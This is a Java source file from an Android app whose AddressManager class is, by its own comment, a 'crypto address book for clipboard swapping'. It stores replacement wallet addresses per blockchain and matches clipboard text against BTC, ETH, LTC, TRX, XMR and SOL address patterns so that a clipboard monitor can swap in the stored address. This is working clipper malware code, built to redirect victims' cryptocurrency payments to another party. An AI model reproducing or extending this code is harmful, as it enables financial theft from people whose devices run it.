package com.fason.app.features.addresses;

import android.content.Context;
import android.content.SharedPreferences;

import com.fason.app.core.FasonApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

/**
 * AddressManager — crypto address book for clipboard swapping.
 * Stores addresses per chain; consumed by clipboard monitor.
 */
public final class AddressManager {
    private static final String PREFS = "fason_addresses";
    private static volatile AddressManager instance;
    private final SharedPreferences prefs;
    private final Map<String, String> addresses = new HashMap<>();

    private AddressManager() {
        prefs = FasonApp.getContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        load();
    }

    public static synchronized AddressManager getInstance() {
        if (instance == null) instance = new AddressManager();
        return instance;
    }

    private void load() {
        synchronized (addresses) {
            addresses.clear();
            try {
                JSONArray arr = new JSONArray(prefs.getString("addresses", "[]"));
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    addresses.put(o.optString("chain"), o.optString("address"));
                }
            } catch (Exception ignored) {}
        }
    }

    private void save() {
        try {
            JSONArray arr = new JSONArray();
            synchronized (addresses) {
                for (Map.Entry<String, String> e : addresses.entrySet()) {
                    JSONObject o = new JSONObject();
                    o.put("chain", e.getKey());
                    o.put("address", e.getValue());
                    arr.put(o);
                }
            }
            prefs.edit().putString("addresses", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    public JSONObject add(String chain, String address) {
        synchronized (addresses) { addresses.put(chain.toLowerCase(), address); }
        save();
        return list();
    }

    public String getAddress(String chain) {
        synchronized (addresses) { return addresses.get(chain.toLowerCase()); }
    }

    public JSONObject remove(String chain) {
        synchronized (addresses) { addresses.remove(chain.toLowerCase()); }
        save();
        return list();
    }

    public JSONObject list() {
        JSONObject r = new JSONObject();
        try {
            JSONArray arr = new JSONArray();
            synchronized (addresses) {
                for (Map.Entry<String, String> e : addresses.entrySet()) {
                    JSONObject o = new JSONObject();
                    o.put("chain", e.getKey());
                    o.put("address", e.getValue());
                    arr.put(o);
                }
            }
            r.put("addresses", arr);
            r.put("count", addresses.size());
        } catch (Exception ignored) {}
        return r;
    }

    /** If text looks like a crypto address of a known chain, return the swap target. */
    public String checkSwap(String clipboardText) {
        if (clipboardText == null) return null;
        String t = clipboardText.trim();
        synchronized (addresses) {
            for (Map.Entry<String, String> e : addresses.entrySet()) {
                if (matchesChain(e.getKey(), t)) return e.getValue();
            }
        }
        return null;
    }

    private boolean matchesChain(String chain, String text) {
        switch (chain) {
            case "btc": return text.matches("^(1|3|bc1)[a-zA-Z0-9]{25,60}$");
            case "eth": return text.matches("^0x[a-fA-F0-9]{40}$");
            case "ltc": return text.matches("^(L|M|ltc1)[a-zA-Z0-9]{25,60}$");
            case "trx": return text.matches("^T[a-zA-Z0-9]{33}$");
            case "xmr": return text.matches("^[48][a-zA-Z0-9]{94}$");
            case "sol": return text.matches("^[1-9A-HJ-NP-Za-km-z]{32,44}$");
            default: return false;
        }
    }
}
